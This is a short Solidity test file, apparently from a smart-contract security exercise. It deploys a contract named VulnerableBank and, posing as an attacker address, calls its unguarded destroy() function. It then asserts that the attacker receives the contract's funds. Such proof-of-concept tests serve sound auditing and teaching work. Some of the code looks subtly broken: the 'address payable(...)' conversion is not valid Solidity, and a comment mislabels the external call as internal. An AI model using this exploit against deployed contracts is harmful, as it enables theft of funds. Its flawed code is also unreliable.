// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract TestVulnerableBank is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        target = new VulnerableBank();
        vm.label(address(target), "VulnerableBank");
    }

    function testExploit() public {
        // Step 1: Deploy the vulnerable contract to the test environment (already done in setup)
        
        // Step 2: Perform an internal call or transaction to trigger the destroy() function
        address attacker = address payable(vm.addr(1));
        vm.prank(attacker);
        target.destroy();

        // Step 3: Monitor the balance of the contract and sender's account after calling destroy()
        assertEq(target.balances(address(this)), 0, "Contract balance should be zero after destroying");
        assertGt(balanceOf(attacker), startingBalance(attacker), "Attacker should receive funds from the destroyed contract");

        // Log balances for verification
        log_balance(attacker);
        log_balance(address(this));
    }
}